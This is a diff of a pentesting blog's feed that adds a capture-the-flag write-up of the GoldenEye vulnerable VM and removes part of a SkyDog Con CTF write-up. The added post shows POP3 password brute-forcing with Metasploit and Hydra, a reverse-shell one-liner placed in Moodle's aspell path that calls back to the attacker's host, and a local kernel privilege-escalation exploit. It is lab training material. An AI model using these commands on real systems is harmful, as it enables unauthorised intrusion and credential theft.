@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-12-27T18:46:13+02:00</updated>
+  <updated>2019-04-02T22:31:08+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,400 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[GoldenEye 007]]></title>
+    <link href="http://chousensha.github.io/blog/2019/04/02/goldeneye-007/"/>
+    <updated>2019-04-02T21:57:39+03:00</updated>
+    <id>http://chousensha.github.io/blog/2019/04/02/goldeneye-007</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired by a James Bond movie:</p>
+
+<blockquote><p>I recently got done creating an OSCP type vulnerable machine that&rsquo;s themed after the great James Bond film (and even better n64 game) GoldenEye.
+The goal is to get root and capture the secret GoldenEye codes &ndash; flag.txt.</p>
+
+<p>I&rsquo;d rate it as Intermediate, it has a good variety of techniques needed to get root &ndash; no exploit development/buffer overflows. After completing
+the OSCP I think this would be a great one to practice on, plus there&rsquo;s a hint of CTF flavor.</p></blockquote>
+
+<!-- more -->
+
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+|_ssl-date: TLS randomness does not represent time
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: GoldenEye Primary Admin Server
+55006/tcp open  ssl/unknown
+|_ssl-date: TLS randomness does not represent time
+55007/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) USER AUTH-RESP-CODE CAPA STLS UIDL PIPELINING RESP-CODES TOP
+|_ssl-date: TLS randomness does not represent time
+</code></p>
+
+<p>Navigating to the web server takes you to this screen:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/web.png" title="&lsquo;goldeneye web&rsquo; &lsquo;goldeneye web&rsquo;" ></p>
+
+<p>In the source code of the page there&rsquo;s a linked <em>terminal.js</em> file. Viewing that reveals some interesting comments:</p>
+
+<p><code>html
+//
+//Boris, make sure you update your default password.
+//My sources say MI6 maybe planning to infiltrate.
+//Be on the lookout for any suspicious network traffic....
+//
+//I encoded you p@ssword below...
+//
+//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;
+//
+//BTW Natalya says she can break your codes
+//
+</code></p>
+
+<p>So we have a HTML encoded password which decodes to <code>InvincibleHack3r</code>. Now we can go to <em>/sev-home</em> and log in as boris with this password.</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/goldeneye.png" title="&lsquo;goldeneye login&rsquo; &lsquo;goldeneye login&rsquo;" ></p>
+
+<p>We can now make use of that POP3 service on port 55007. Boris' credentials didn&rsquo;t work though. I used Nikto to further look at the web server and got an interesting hit:</p>
+
+<p><code>
++ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
+</code></p>
+
+<p>Going to that page wasn&rsquo;t immediately useful though, but maybe some of the information could be used further:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/splashadmin.png" title="&lsquo;splashadmin&rsquo; &lsquo;splashadmin&rsquo;" ></p>
+
+<p>With nothing else to go from, I attempted to bruteforce the mail login credentials for boris with the Metasploit <em>scanner/pop3/pop3_login</em> module and the <em>fasttrack.txt</em> wordlist:</p>
+
+<p><code>
+[+] 192.168.159.130:55007 - 192.168.159.130:55007 - Success: 'boris:secret1!' '+OK Logged in.  '
+</code></p>
+
+<p>So now we have credentials for Boris' mail and I was able to read his mails:</p>
+
+<p>```
+nc 192.168.159.130 55007
++OK GoldenEye POP3 Electronic-Mail System
+USER boris
++OK
+PASS secret1!
++OK Logged in.
+LIST
++OK 3 messages:
+1 544
+2 373
+3 921
+.
+RETR 1
++OK 544 octets
+Return-Path: <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#114;&#x6f;&#111;&#116;&#64;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#x31;&#46;&#x67;&#x6f;&#108;&#100;&#x65;&#x6e;&#101;&#121;&#x65;">&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#x32;&#55;&#46;&#x30;&#46;&#48;&#x2e;&#49;&#x2e;&#x67;&#111;&#108;&#100;&#101;&#x6e;&#101;&#121;&#101;</a>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])</p>
+
+<pre><code>by ubuntu (Postfix) with SMTP id D9E47454B1
+for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+</code></pre>
+
+<p>Message-Id: &lt;20180425022326.D9E47454B1@ubuntu>
+Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+From: <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#114;&#111;&#111;&#116;&#x40;&#49;&#x32;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#x31;&#x2e;&#x67;&#111;&#108;&#x64;&#101;&#x6e;&#x65;&#121;&#101;">&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#49;&#46;&#103;&#x6f;&#x6c;&#100;&#x65;&#x6e;&#101;&#121;&#x65;</a></p>
+
+<p>Boris, this is admin. You can electronically communicate to co-workers and students here. I&rsquo;m not going to scan emails for security risks because I trust you and the other admins here.
+.
+RETR 2
++OK 373 octets
+Return-Path: &lt;natalya@ubuntu>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])</p>
+
+<pre><code>by ubuntu (Postfix) with ESMTP id C3F2B454B1
+for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+</code></pre>
+
+<p>Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu>
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+From: natalya@ubuntu</p>
+
+<p>Boris, I can break your codes!
+.
+RETR 3
++OK 921 octets
+Return-Path: <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x61;&#x6c;&#x65;&#x63;&#x40;&#106;&#97;&#x6e;&#x75;&#x73;&#46;&#x62;&#x6f;&#x73;&#x73;">&#x61;&#108;&#x65;&#x63;&#x40;&#106;&#x61;&#x6e;&#x75;&#x73;&#x2e;&#98;&#x6f;&#x73;&#115;</a>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])</p>
+
+<pre><code>by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+</code></pre>
+
+<p>Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu>
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#97;&#108;&#101;&#99;&#64;&#106;&#x61;&#x6e;&#x75;&#115;&#x2e;&#98;&#x6f;&#115;&#115;">&#x61;&#108;&#x65;&#99;&#x40;&#106;&#x61;&#110;&#117;&#115;&#x2e;&#98;&#x6f;&#x73;&#115;</a></p>
+
+<p>Boris,</p>
+
+<p>Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</p>
+
+<p>Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages&hellip;.</p>
+
+<p>PS &ndash; Keep security tight or we will be compromised.
+```</p>
+
+<p>We now know to look for access codes once we get a shell on the target. We also learned there&rsquo;s another username on the ubuntu domain: natalya. So I kicked off the bruteforce for her account as well, this time with Hydra, because I wasn&rsquo;t happy with the speed of the Metasploit module.</p>
+
+<p><code>
+hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.159.130 -s 55007 pop3 -f
+[55007][pop3] host: 192.168.159.130   login: natalya   password: bird
+</code></p>
+
+<p>Got lucky with natalya as well. Now back to reading emails:</p>
+
+<p>```
+nc 192.168.159.130 55007
++OK GoldenEye POP3 Electronic-Mail System
+USER natalya
++OK
+PASS bird
++OK Logged in.
+LIST
++OK 2 messages:
+1 631
+2 1048
+.
+RETR 1
++OK 631 octets
+Return-Path: &lt;root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])</p>
+
+<pre><code>by ubuntu (Postfix) with ESMTP id D5EDA454B1
+for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+</code></pre>
+
+<p>Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu>
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu</p>
+
+<p>Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</p>
+
+<p>Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+RETR 2
++OK 1048 octets
+Return-Path: &lt;root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])</p>
+
+<pre><code>by ubuntu (Postfix) with SMTP id 17C96454B1
+for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+</code></pre>
+
+<p>Message-Id: &lt;20180425031956.17C96454B1@ubuntu>
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu</p>
+
+<p>Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&rsquo;s related to security&hellip;even if it&rsquo;s not, just enter it in under the guise of &ldquo;security&rdquo;&hellip;it&rsquo;ll get the change order escalated without much hassle :)</p>
+
+<p>Ok, user creds are:</p>
+
+<p>username: xenia
+password: RCP90rulez!</p>
+
+<p>Boris verified her as a valid contractor so just create the account ok?</p>
+
+<p>And if you didn&rsquo;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network&hellip;.</p>
+
+<p>Since you&rsquo;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+```</p>
+
+<p>Now we&rsquo;ve learned some interesting things..it seems Boris is a double agent! We now have a new set of credentials: <code>xenia:RCP90rulez!</code> and the internal domain for which we have to add an entry in our hosts file. With that done, going to the URL took me to a training portal:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/moodle.png" title="&lsquo;moodle&rsquo; &lsquo;moodle&rsquo;" ></p>
+
+<p>We can log in as Xenia and find a message on the platform:</p>
+
+<p>```
+Tuesday, 24 April 2018
+09:24 PM: Greetings Xenia,</p>
+
+<p>As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.</p>
+
+<p>My email username is&hellip;</p>
+
+<p>doak</p>
+
+<p>Thank you,</p>
+
+<p>Cheers,</p>
+
+<p>Dr. Doak &ldquo;The Doctor&rdquo;
+```</p>
+
+<p>We have a new mail username and by now we know what&rsquo;s coming..</p>
+
+<p><code>
+[55007][pop3] host: 192.168.159.130   login: doak   password: goat
+</code></p>
+
+<p>There&rsquo;s only one mail, but it contains portal credentials:</p>
+
+<p>```
+Return-Path: &lt;doak@ubuntu>
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])</p>
+
+<pre><code>by ubuntu (Postfix) with SMTP id 97DC24549D
+for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+</code></pre>
+
+<p>Message-Id: &lt;20180425034731.97DC24549D@ubuntu>
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu</p>
+
+<p>James,
+If you&rsquo;re reading this, congrats you&rsquo;ve gotten this far. You know how tradecraft works right?</p>
+
+<p>Because I don&rsquo;t. Go to our training site and login to my account&hellip;.dig until you can exfiltrate further information&hellip;&hellip;</p>
+
+<p>username: dr_doak
+password: 4England!
+```</p>
+
+<p>Look around until you find a secret file inside My private files:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/secret.png" title="&lsquo;secret&rsquo; &lsquo;secret&rsquo;" ></p>
+
+<p>The contents are:</p>
+
+<p>```
+007,</p>
+
+<p>I was able to capture this apps adm1n cr3ds through clear txt.</p>
+
+<p>Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.</p>
+
+<p>Something juicy is located here: /dir007key/for-007.jpg</p>
+
+<p>Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+```</p>
+
+<p>The image most likely has hidden data within:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/for-007.jpg" title="&lsquo;message for 007&rsquo; &lsquo;message for 007&rsquo;" ></p>
+
+<p>Running strings on the image reveals a base64 string: <em>eFdpbnRlcjE5OTV4IQ==</em>, which is decoded to <code>xWinter1995x!</code>. Now we can log in as admin to the platform. After some more recon, it seems that we can achieve RCE with a Metasploit exploit for Moodle:</p>
+
+<blockquote><p>Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point
+to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands
+in the context of the web application upon spellchecking requests. This module also allows an attacker to leverage another privilege escalation
+vuln. Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that
+of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user. This module was tested against Moodle version
+2.5.2 and 2.2.3.</p></blockquote>
+
+<p>The admin account we hijacked has the necessary privileges, so we can use this exploit.</p>
+
+<p>```
+Module options (exploit/multi/http/moodle_cmd_exec):</p>
+
+<p>   Name       Current Setting        Required  Description</p>
+
+<hr />
+
+<p>   PASSWORD   xWinter1995x!          yes       Password to authenticate with
+   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
+   RHOSTS     severnaya-station.com  yes       The target address range or CIDR identifier
+   RPORT      80                     yes       The target port (TCP)
+   SESSKEY                           no        The session key of the user to impersonate
+   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /gnocertdir            yes       The URI of the Moodle installation
+   USERNAME   admin                  yes       Username to authenticate with
+   VHOST                             no        HTTP server virtual host
+```</p>
+
+<p>It seemed straightforward, but the exploit failed to run for me. I looked over the source code and saw that the spellcheck engine that is set by the exploit is PSpellShell. By default on the site, the TinyMCE HTML editor spell engine selected was Google Spell. So I manually changed this and ran the exploit again, but it still didn&rsquo;t work. So I did it manually. Recall this part:</p>
+
+<blockquote><p>By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application
+upon spellchecking requests</p></blockquote>
+
+<p>Under Server &ndash;> System paths, I edited the <strong>Path to aspell</strong> field with this reverse shell one-liner (had to cycle through a couple before finding one that worked): <code>sh -c &lsquo;(mknod /tmp/backpipe p 2> /dev/null &amp;&amp; /bin/bash 0</tmp/backpipe | telnet 192.168.159.129 8080 1>/tmp/backpipe &amp;)&rsquo;</code></p>
+
+<p>Now if you go to Blogs and add a new entry, you can invoke the spellchecker by clicking on the spellcheck button:</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/spellcheck.png" title="&lsquo;spellcheck&rsquo; &lsquo;spellcheck&rsquo;" ></p>
+
+<p>And you should receive a shell on your listener. I upgraded it to a proper one:</p>
+
+<p><code>
+nc -vnlp 8080
+listening on [any] 8080 ...
+connect to [192.168.159.129] from (UNKNOWN) [192.168.159.130] 54586
+whoami
+www-data
+python -c 'import pty;pty.spawn("/bin/bash")'
+&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$
+</code></p>
+
+<p>The kernel version is really old:</p>
+
+<p><code>
+uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+</code></p>
+
+<p>I used the <a href="https://www.exploit-db.com/exploits/37292">overlayfs</a> exploit. There was no GCC on the box, but remember that webpage that mentioned clang. I compiled the exploit with clang: <code>clang 37292.c</code>. There were 5 warnings generated, but an executable a.out was generated. However, it didn&rsquo;t give me a root shell. When I looked through the exploit source code, I found a gcc reference:</p>
+
+<p><code>c
+lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
+</code></p>
+
+<p>Replacing gcc with cc (the default compiler) in this line and recompiling the code worked and I got root. Then I found the secret codes inside a hidden file in /root:</p>
+
+<p>```</p>
+
+<h1>cat /root/.flag.txt</h1>
+
+<p>cat /root/.flag.txt
+Alec told me to place the codes here:</p>
+
+<p>568628e0d993b1973adc718237da6e93</p>
+
+<p>If you captured this make sure to go here&hellip;..
+/006-final/xvf7-flag/
+```</p>
+
+<p>Visit that path on the web server and mission accomplished!</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/flag.png" title="&lsquo;flag&rsquo; &lsquo;flag&rsquo;" ></p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ Excellent time to become a missing \
+\ person.                            /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Getting in the W1R3S]]></title>
@@ -442,7 +836,7 @@ computer         (w1r3s)
 <p>With this, I could SSH in.</p>
 
 <p>```
-ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x77;&#49;&#x72;&#x33;&#x73;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x31;&#x34;&#x35;&#46;&#49;&#51;&#x34;">&#x77;&#x31;&#x72;&#51;&#x73;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x31;&#52;&#x35;&#x2e;&#x31;&#51;&#52;</a>
+ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#119;&#49;&#x72;&#51;&#115;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x31;&#x34;&#53;&#46;&#x31;&#x33;&#52;">&#119;&#49;&#114;&#x33;&#115;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#49;&#x34;&#53;&#x2e;&#x31;&#x33;&#x34;</a>
 The authenticity of host &lsquo;192.168.145.134 (192.168.145.134)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.
 Are you sure you want to continue connecting (yes/no)? yes</p>
@@ -453,7 +847,7 @@ Are you sure you want to continue connecting (yes/no)? yes</p>
 
 <h2>Well,&hellip;&hellip;..possibly.</h2>
 
-<p><a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x77;&#x31;&#x72;&#51;&#x73;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#x31;&#x34;&#x35;&#46;&#49;&#51;&#52;">&#x77;&#49;&#114;&#x33;&#115;&#64;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#x34;&#53;&#46;&#49;&#x33;&#52;</a>&rsquo;s password:
+<p><a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x77;&#x31;&#114;&#x33;&#115;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#52;&#53;&#46;&#x31;&#51;&#x34;">&#119;&#49;&#x72;&#51;&#x73;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#49;&#x34;&#53;&#46;&#49;&#51;&#x34;</a>&rsquo;s password:
 Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</p>
 
 <ul>
@@ -1365,7 +1759,7 @@ fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
 <p>When trying to SSH with the key, I got prompted for a passphrase. I took a swing at it with the message from the image, <em>usetheforce</em>, and it was a win:</p>
 
 <p>```
-ssh <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x72;&#x6f;&#111;&#116;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#x31;&#52;&#x35;&#46;&#49;&#51;&#56;">&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x34;&#53;&#46;&#x31;&#51;&#x38;</a> -p 62964 -i ssh.key
+ssh <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#114;&#x6f;&#111;&#116;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#52;&#53;&#x2e;&#49;&#x33;&#x38;">&#114;&#x6f;&#111;&#x74;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#49;&#52;&#53;&#x2e;&#49;&#x33;&#56;</a> -p 62964 -i ssh.key
 Enter passphrase for key &lsquo;ssh.key&rsquo;:</p>
 
 <p>Last login: Tue Dec  6 05:40:07 2016 from 172.16.0.18</p>
@@ -1682,336 +2076,6 @@ __/ /  2    .' o4o `.    6  \ \__    1 ... Storage Gallery (levels 1-2),
 | power, I gain victory. Through victory, |
 | my chains are broken. The Force shall   |
 \ free me.                                /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SkyDog Con CTF 2016 - Catch Me If You Can]]></title>
-    <link href="http://chousensha.github.io/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/"/>
-    <updated>2018-10-20T18:53:46+03:00</updated>
-    <id>http://chousensha.github.io/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can</id>
-    <content type="html"><![CDATA[<p>For this box, you have to find 8 flags, each containing an MD5 hash.</p>
-
-<!-- more -->
-
-
-<p>```
-nmap -T4 -sC -sV -p- 192.168.145.136</p>
-
-<p>PORT      STATE  SERVICE  VERSION
-22/tcp    closed ssh
-80/tcp    open   http     Apache httpd 2.4.18 ((Ubuntu))
-|<em>http-server-header: Apache/2.4.18 (Ubuntu)
-|</em>http-title: SkyDog Con CTF 2016 &ndash; Catch Me If You Can
-443/tcp   open   ssl/http Apache httpd 2.4.18 ((Ubuntu))
-|<em>http-server-header: Apache/2.4.18 (Ubuntu)
-|</em>http-title: SkyDog Con CTF 2016 &ndash; Catch Me If You Can
-| ssl-cert: Subject: commonName=Network Solutions EV Server CA 2/organizationName=Network Solutions L.L.C./stateOrProvinceName=VA/countryName=US
-| Not valid before: 2016-09-21T14:51:57
-|<em>Not valid after:  2017-09-21T14:51:57
-|</em>ssl-date: TLS randomness does not represent time
-| tls-alpn:
-|   http/1.1
-22222/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 b6:64:7c:d1:55:46:4e:50:e3:ba:cf:4c:1e:81:f9:db (RSA)
-|   256 ef:17:df:cc:db:2e:c5:24:e3:9e:25:16:3d:25:68:35 (ECDSA)
-|_  256 0e:1b:3f:c3:4a:56:a0:ef:4d:2a:af:a1:7e:94:d2:06 (ED25519)
-```</p>
-
-<h2>Flag #1 Don’t go Home Frank! There’s a Hex on Your House.</h2>
-
-<p>Starting with the web server, the web page is the homepage of the SkyDog con. Poking through the source, I found a suspicious comment:</p>
-
-<p>```</p>
-
-<!--[If IE4]><script src="http://chousensha.github.io/oldIE/html5.js"></script><![Make sure to remove this before going to PROD]-->
-
-
-<p>
-```</p>
-
-<p>Going to the above mentioned JS file, on the first line we find a hex string:</p>
-
-<p><code>
-/* 666c61677b37633031333230373061306566373164353432363633653964633166356465657d */
-</code></p>
-
-<p>Decoded, it gives the first flag: <code>flag{7c0132070a0ef71d542663e9dc1f5dee}</code>. And decoding the MD5 hash gives a hint: <code>nmap</code></p>
-
-<h2>Flag #2 Obscurity or Security?</h2>
-
-<p>I already ran Nmap and saw that SSH is listening on port 22222. Trying to SSH as frank gives the next flag:</p>
-
-<p>```
-ssh <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x66;&#114;&#97;&#110;&#x6b;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x31;&#x34;&#x35;&#46;&#x31;&#x33;&#54;">&#102;&#114;&#x61;&#110;&#x6b;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x31;&#x34;&#x35;&#x2e;&#x31;&#51;&#x36;</a> -p 22222
-The authenticity of host &lsquo;[192.168.145.136]:22222 ([192.168.145.136]:22222)&rsquo; can&rsquo;t be established.
-ECDSA key fingerprint is SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added &lsquo;[192.168.145.136]:22222&rsquo; (ECDSA) to the list of known hosts.</p>
-
-<h6>#</h6>
-
-<h1>WARNING</h1>
-
-<h1>FBI &ndash; Authorized access only!                 #</h1>
-
-<h1>Disconnect IMMEDIATELY if you are not an authorized user!!!</h1>
-
-<h1>All actions Will be monitored and recorded</h1>
-
-<h1>Flag{53c82eba31f6d416f331de9162ebe997}</h1>
-
-<h6>#</h6>
-
-<p><a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x66;&#114;&#97;&#x6e;&#107;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#x34;&#53;&#x2e;&#49;&#x33;&#x36;">&#102;&#x72;&#97;&#110;&#107;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x34;&#53;&#x2e;&#49;&#x33;&#x36;</a>&rsquo;s password:
-```</p>
-
-<p>The decoded hint is <code>encrypt</code></p>
-
-<h2>Flag #3 Be Careful Agent, Frank Has Been Known to Intercept Traffic Our Traffic.</h2>
-
-<p>Remember that Nmap found also port 443 open, so I switched to https to check it out and was greeted by a self-signed certificate. Viewing the certificate gives the third flag: <code>flag3{f82366a9ddc064585d54e3f78bde3221}</code></p>
-
-<p><img class="center" src="/images/pentest/skydogctf/flag3.jpg" title="&lsquo;flag3&rsquo; &lsquo;flag3&rsquo;" ></p>
-
-<p>And the next hint is <code>personnel</code></p>
-
-<h2>Flag #4 A Good Agent is Hard to Find.</h2>
-
-<p>I tried navigating to /personnel on the web server and it gave me the following message:</p>
-
-<p><code>
-ACCESS DENIED!!! You Do Not Appear To Be Coming From An FBI Workstation. Preparing Interrogation Room 1. Car Batteries Charging....
-</code></p>
-
-<p>So we need a specific user agent. Remembering the included JS file of the first flag, that hinted towards an old Internet Explorer version, I revisited it and searched for the string <em>fbi</em> inside it and found the lines:</p>
-
-<p><code>
-/* maindev -  6/7/02 Adding temporary support for IE4 FBI Workstations */
-/* newmaindev -  5/22/16 Last maindev was and idoit and IE4 is still Gold image -@Support doug.perterson@fbi.gov */
-</code></p>
-
-<p>So FBI agents use IE4 on their workstations. Cool, nothing catastrophically wrong there. I grabbed an IE4 user agent from <a href="http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer,">http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer,</a> changed my User Agent to <code>User-Agent: Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)</code>, and went straight to the FBI portal!</p>
-
-<p><img class="center" src="/images/pentest/skydogctf/fbiportal.png" title="&lsquo;fbi portal&rsquo; &lsquo;fbi portal&rsquo;" ></p>
-
-<p>The flag is on the page: <code> flag{14e10d570047667f904261e6d08f520f}</code>, and the decoded value is <code>evidence</code></p>
-
-<h2>Flag #5 The Devil is in the Details &ndash; Or is it Dialogue? Either Way, if it’s Simple, Guessable, or Personal it Goes Against Best Practices</h2>
-
-<p>Following up on the clue <em>new+flag</em>, I tried navigating to 192.168.145.136/newevidence and a basic authentication prompt asked me for credentials. On the FBI portal we have the message &ldquo;Welcome Agent Hanratty&rdquo;. A quick Google reveals that this is a reference to agent Carl Hanratty from the movie Catch Me If You Can. I went through the dialogue (hint hint) on the <a href="https://www.imdb.com/title/tt0264464/characters/nm0000158">IMDB page</a> to find out Carl&rsquo;s daughter is called Grace (simple? guessable? personal?). I tried some combinations in the pop up until I found the right one is <em>carl.hanratty/Grace</em> (remember the naming convention of doug.perterson)</p>
-
-<p><img class="center" src="/images/pentest/skydogctf/newevidence.png" title="&lsquo;new evidence&rsquo; &lsquo;new evidence&rsquo;" ></p>
-
-<p>The flag is in the Evidence Summary File: <code>flag{117c240d49f54096413dd64280399ea9}</code>. The hint is <code>panam</code></p>
-
-<h2>Flag #6 Where in the World is Frank?</h2>
-
-<p>For this one you have to work with the other 2 files from the page, the image and the PDF invoice. The invoice mentions an encryption consultation project:</p>
-
